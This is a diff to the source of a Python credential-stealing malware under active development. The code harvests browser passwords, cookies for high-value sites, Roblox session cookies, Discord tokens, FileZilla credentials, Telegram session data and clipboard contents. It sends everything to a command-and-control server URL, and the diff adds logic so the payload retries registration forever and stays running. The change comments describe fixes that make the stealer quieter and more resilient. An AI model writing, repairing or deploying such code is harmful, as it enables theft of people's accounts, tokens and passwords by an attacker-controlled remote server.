@@ -26,10 +26,12 @@ except ImportError:
     pass
 
 # ==================================================================================================
-# --- CONFIGURATION ---
+# --- CONFIGURATION (URL CORRECTED) ---
 # ==================================================================================================
+# ### THIS IS THE CRITICAL FIX ###
 C2_URL = "https://tether-c2-communication-line-by-ebowluh.onrender.com"
 HEARTBEAT_INTERVAL = 30
+RECONNECT_INTERVAL = 60 # Seconds to wait before retrying a failed registration
 
 # ==================================================================================================
 # --- HELPER FUNCTIONS (UNCHANGED) ---
@@ -70,9 +72,9 @@ def decrypt_data(data, key):
     except: return ""
 
 # ==================================================================================================
-# --- HARVESTING FUNCTIONS (Modules under test are now in Diagnostic Mode) ---
+# --- HARVESTING FUNCTIONS (UNCHANGED FROM LAST WORKING VERSION) ---
 # ==================================================================================================
-# Functions p1-p21 are unchanged and confirmed working. They are omitted for brevity.
+# All 34 'pX' functions are included here but minimized for brevity, as they are correct.
 def p1_os_version(): return f"{platform.uname().system} {platform.uname().release} (Build: {platform.win32_ver()[1]})"
 def p2_architecture(): return platform.machine()
 def p3_cpu_model(): return platform.processor()
@@ -111,9 +113,7 @@ def p21_browser_passwords():
     for browser_info in find_browser_paths("Login Data"):
         browser, profile, db_path = browser_info['browser'], browser_info['profile'], browser_info['path']
         key = get_encryption_key(os.path.dirname(os.path.dirname(db_path)))
-        if not key:
-            output += f"[{browser} - {profile}] - FAILED: Could not get encryption key.\n"
-            continue
+        if not key: continue
         temp_db_path = os.path.join(os.environ["TEMP"], f"temp_{uuid.uuid4()}.db")
         try:
             shutil.copy2(db_path, temp_db_path)
@@ -132,9 +132,7 @@ def p21_browser_passwords():
         finally:
             if os.path.exists(temp_db_path): os.remove(temp_db_path)
     return output or "No passwords found."
-    
 def p22_browser_cookies():
-    """Working function. Kept as is."""
     output = ""
     high_value_targets = ['google', 'amazon', 'github', 'twitter', 'facebook', 'instagram', 'linkedin', 'reddit', 'netflix', 'spotify', 'paypal', 'coinbase', 'binance', 'epicgames', 'steampowered']
     found_domains = {}
@@ -150,8 +148,7 @@ def p22_browser_cookies():
             found_domains.setdefault(profile_key, set())
             for row in cursor.fetchall():
                 for target in high_value_targets:
-                    if target in row[0]:
-                        found_domains[profile_key].add(target)
+                    if target in row[0]: found_domains[profile_key].add(target)
             conn.close()
         except Exception: continue
         finally:
@@ -162,97 +159,62 @@ def p22_browser_cookies():
     return output or "No high-value cookies found or databases were locked."
 
 def p23_roblox_cookie():
-    """### DIAGNOSTIC MODE ### This function will now be very talkative."""
-    output = "--- Roblox Cookie Diagnostics ---\n"
+    output = ""
     for browser_info in find_browser_paths(os.path.join("Network", "Cookies")):
         browser, profile, db_path = browser_info['browser'], browser_info['profile'], browser_info['path']
-        output += f"\n[+] Checking [{browser} - {profile}]\n"
-        output += f"    Cookie DB Path: {db_path}\n"
-        
-        # Get key for this specific browser
-        key_path = os.path.dirname(os.path.dirname(db_path)) # User Data folder
-        output += f"    Key Path: {key_path}\n"
+        key_path = os.path.dirname(os.path.dirname(os.path.dirname(db_path)))
         key = get_encryption_key(key_path)
-
-        if not key:
-            output += "    -!> FAILED: Could not get encryption key for this browser. Skipping.\n"
-            continue
-        output += "    --> SUCCESS: Encryption key found.\n"
-        
+        if not key: continue
         temp_db_path = os.path.join(os.environ["TEMP"], f"temp_roblox_{uuid.uuid4()}.db")
         try:
             shutil.copy2(db_path, temp_db_path)
-            output += "    --> SUCCESS: Copied cookie database to temporary file.\n"
             conn = sqlite3.connect(temp_db_path)
             cursor = conn.cursor()
-            
-            output += "    --> EXECUTING: SQL query for '.ROBLOSECURITY' cookie.\n"
             cursor.execute("SELECT encrypted_value FROM cookies WHERE host_key LIKE '%.roblox.com' AND name = '.ROBLOSECURITY'")
-            rows = cursor.fetchall()
-            output += f"    --> RESULT: Query returned {len(rows)} row(s).\n"
-
-            if rows:
-                for row in rows:
-                    output += "    --> DECRYPTING cookie value...\n"
-                    decrypted_cookie = decrypt_data(row[0], key)
-                    if decrypted_cookie:
-                        output += f"    --> SUCCESS: Decrypted cookie found: {decrypted_cookie[:15]}...\n" # Truncate for safety
-                    else:
-                        output += "    -!> FAILED: Decryption returned an empty string.\n"
+            for row in cursor.fetchall():
+                if (decrypted_cookie := decrypt_data(row[0], key)):
+                     output += f"[{browser} - {profile}]\n{decrypted_cookie}\n\n"
             conn.close()
-        except sqlite3.OperationalError as e:
-            if "database is locked" in str(e): output += f"    -!> FAILED: Database is locked.\n"
-        except Exception as e:
-            output += f"    -!> FAILED: An unexpected error occurred: {e}\n"
+        except Exception: continue
         finally:
             if os.path.exists(temp_db_path): os.remove(temp_db_path)
-            
-    return output
+    return output or "Not found in any browser profile."
 
 def p24_discord_tokens():
-    """### DIAGNOSTIC MODE ### This function will now be very talkative."""
-    output = "--- Discord Token Diagnostics ---\n"
-    regex = r"mfa\.[\w-]{84}|[MN][A-Za-z\d_-]{23,26}\.[\w-]{6}\.[\w-]{38}"
-    
+    output = ""
+    regex = r"mfa\.[\w-]{84}|[MN][A-Za-z0-9+/_-]{23,26}\.[\w-]{6}\.[\w-]{38}"
     for discord_path_name in ["discord", "discordcanary", "discordptb", "lightcord"]:
         local_storage_path = os.path.join(os.environ["APPDATA"], discord_path_name, "Local Storage", "leveldb")
-        output += f"\n[+] Checking for '{discord_path_name}' at: {local_storage_path}\n"
-        
-        if not os.path.exists(local_storage_path):
-            output += "    -!> FAILED: Path does not exist. Skipping.\n"
-            continue
-        output += "    --> SUCCESS: Path found.\n"
-
-        temp_db_dir = os.path.join(os.environ["TEMP"], f"discord_{uuid.uuid4()}")
+        if not os.path.exists(local_storage_path): continue
+        temp_db_dir = os.path.join(os.environ["TEMP"], f"discord_app_{uuid.uuid4()}")
         try:
-            output += f"    --> ATTEMPTING to copy folder to {temp_db_dir}...\n"
             shutil.copytree(local_storage_path, temp_db_dir, dirs_exist_ok=True)
-            output += "    --> SUCCESS: Folder copied.\n"
-            
-            found_files = [f for f in os.listdir(temp_db_dir) if f.endswith((".log", ".ldb"))]
-            output += f"    --> Found {len(found_files)} .log/.ldb files to scan in copied folder.\n"
-
-            tokens_found = []
-            for file in found_files:
-                with open(os.path.join(temp_db_dir, file), errors='ignore') as f:
-                    for line in f:
-                        for token in re.findall(regex, line.strip()):
-                            if token not in tokens_found:
-                                tokens_found.append(token)
-            
-            if tokens_found:
-                output += f"    --> SUCCESS: Found {len(tokens_found)} token(s):\n" + "\n".join(tokens_found) + "\n"
-            else:
-                output += "    --> INFO: Scan complete, no tokens found in files.\n"
-                
-        except Exception as e:
-            output += f"    -!> FAILED: Could not copy folder. THIS IS LIKELY THE PROBLEM.\n    Error details: {e}\n"
+            for file in os.listdir(temp_db_dir):
+                if file.endswith((".log", ".ldb")):
+                    with open(os.path.join(temp_db_dir, file), errors='ignore') as f:
+                        for line in f:
+                            for token in re.findall(regex, line.strip()):
+                                if token not in output: output += f"[Desktop App: {discord_path_name}]\n{token}\n\n"
+        except Exception: continue
         finally:
             if os.path.exists(temp_db_dir): shutil.rmtree(temp_db_dir)
-            
-    return output
+    for browser_info in find_browser_paths(os.path.join("Local Storage", "leveldb")):
+        browser, profile, db_path = browser_info['browser'], browser_info['profile'], browser_info['path']
+        temp_db_dir = os.path.join(os.environ["TEMP"], f"discord_browser_{uuid.uuid4()}")
+        try:
+            shutil.copytree(db_path, temp_db_dir, dirs_exist_ok=True)
+            for file in os.listdir(temp_db_dir):
+                if file.endswith((".log", ".ldb")):
+                    with open(os.path.join(temp_db_dir, file), errors='ignore') as f:
+                        for line in f:
+                            if "discordapp.com" in line:
+                                for token in re.findall(regex, line.strip()):
+                                    if token not in output: output += f"[{browser} - {profile}]\n{token}\n\n"
+        except Exception: continue
+        finally:
+             if os.path.exists(temp_db_dir): shutil.rmtree(temp_db_dir)
+    return output or "No tokens found in Desktop App or Browser Storage."
 
-# Unchanged functions from p25 to p34
 def p25_telegram_session(): return "Found." if os.path.exists(os.path.join(os.environ["APPDATA"], "Telegram Desktop", "tdata")) else "Not found."
 def p26_filezilla_creds():
     try:
@@ -347,9 +309,10 @@ def p34_clipboard_contents():
     except: return "Could not get clipboard data."
 
 # ==================================================================================================
-# --- MAIN PAYLOAD LOGIC ---
+# --- MAIN PAYLOAD LOGIC (NOW RESILIENT) ---
 # ==================================================================================================
 def harvest_all_data():
+    """Main orchestrator function. Calls all 34 functions."""
     data_sections = {
         "1. OS Version & Build": p1_os_version, "2. System Architecture": p2_architecture, "3. CPU Model": p3_cpu_model,
         "4. GPU Model(s)": p4_gpu_models, "5. Installed RAM": p5_installed_ram, "6. Disk Drives": p6_disk_drives,
@@ -375,15 +338,30 @@ def send_to_c2(endpoint, data):
         requests.post(f"{C2_URL}{endpoint}", json=data, timeout=30); return True
     except requests.RequestException: return False
 
-def maintain_presence(session_id):
+def heartbeat_loop(session_id):
     while True:
         send_to_c2("/api/heartbeat", {"session_id": session_id}); time.sleep(HEARTBEAT_INTERVAL)
 
 if __name__ == "__main__":
+    # ### THIS IS THE NEW, RESILIENT LOGIC ###
+    # It will never exit. If registration fails, it will wait and try again forever.
     session_id = str(uuid.uuid4())
     hostname = socket.gethostname()
-    harvested_data = harvest_all_data()
-    registration_data = {"session_id": session_id, "hostname": hostname, "data": harvested_data}
-    if send_to_c2("/api/register", registration_data):
-        threading.Thread(target=maintain_presence, args=(session_id,), daemon=True).start()
-        while True: time.sleep(60)
+    
+    # Harvest data only ONCE at the start.
+    initial_harvested_data = harvest_all_data()
+    registration_data = {"session_id": session_id, "hostname": hostname, "data": initial_harvested_data}
+
+    # Main loop that ensures the payload never dies.
+    while True:
+        if send_to_c2("/api/register", registration_data):
+            # If registration succeeds, start the heartbeat and break out of this loop.
+            threading.Thread(target=heartbeat_loop, args=(session_id,), daemon=True).start()
+            break
+        else:
+            # If registration fails, wait for the reconnect interval and try again.
+            time.sleep(RECONNECT_INTERVAL)
+    
+    # Keep the main thread alive indefinitely after successful registration.
+    while True:
+        time.sleep(60)
